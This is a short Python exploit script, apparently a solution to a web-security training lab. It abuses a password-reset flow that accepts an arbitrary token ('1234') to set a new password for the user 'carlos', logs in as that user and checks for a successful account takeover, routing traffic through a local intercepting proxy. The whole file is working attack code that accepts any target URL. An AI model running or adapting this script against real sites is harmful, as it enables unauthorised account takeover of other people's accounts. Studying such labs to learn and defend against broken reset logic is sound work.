import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def access_carlos_account(s, url):

    #reset password for carlos account
    print("(+) Resetting password for carlos account...")
    password_reset_url = url + "/forgot-password?temp-forgot-password-token=1234"
    password_reset_data = {
        "temp-forgot-password-token": "1234",
        "username": "carlos",   
        "new-password-1": "newpassword",
        "new-password-2": "newpassword"
    }
    r = s.post(password_reset_url, data=password_reset_data, proxies=proxies , verify=False)

    # log into carlos account with new password
    print("(+) Logging into carlos account with new password...")
    login_url = url + "/login"
    data = {
        "username": "carlos",
        "password": "newpassword"
    }
    r = s.post(login_url, data=data, verify=False, proxies=proxies, allow_redirects=False)

    # Confirm Bypass
    account_url = url + "/my-account"
    r = s.get(account_url, verify=False, proxies=proxies)
    if 'Log out' in r.text:
        print("(+) Successfully reset password and logged into carlos account!")
    else:
        print("(-) Failed to reset password and log into carlos account. Exploit failed.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s https://example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    access_carlos_account(s, url)

if __name__ == "__main__":
    main()
